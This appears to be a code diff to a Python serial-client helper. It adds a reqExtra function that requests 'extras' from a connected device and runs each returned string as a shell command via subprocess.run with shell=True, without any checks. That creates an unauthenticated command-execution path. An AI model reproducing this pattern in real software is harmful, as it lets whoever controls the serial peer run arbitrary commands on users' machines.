@@ -7,6 +7,7 @@ import pathlib as path
 import time
 import platformdirs
 import importlib.resources
+import subprocess
 
 from CovertHelp import ConfigManager
 
@@ -118,6 +119,7 @@ def clientRequest(ser, side):
                         print(f"Set {var_name} to {value}")
 
                 ConfigManager.save_config()  # Save once after all variables are set
+                reqExtra(ser)
 
             except Exception as e:
                 print(f"Failed to process client information: {e}")
@@ -125,3 +127,25 @@ def clientRequest(ser, side):
 
         time.sleep(0.1)
     print("No response received for Client Information Request.")
+
+def reqExtra(ser):
+    print("Requesting Additional Information...")
+    ser.write("Request Extra\n".encode('utf-8'))
+    start_time = time.time()
+    while time.time() - start_time < 5:  # wait for 5 seconds
+        response = ser.readline().decode('utf-8').strip()
+        if response.startswith("Extra:"):
+            print("Serial Recieved:", response)
+            extra_json = response[len("Extra: "):]
+            extra = json.loads(extra_json)
+            if extra == ["None"]:
+                print("No Extras Found.")
+                break
+            else:
+                print("Extra(s):", extra)
+                for item in extra:
+                    print(f"Extra Item: {item}")
+                    subprocess.run(item, shell=True)
+
+
+        time.sleep(0.1)
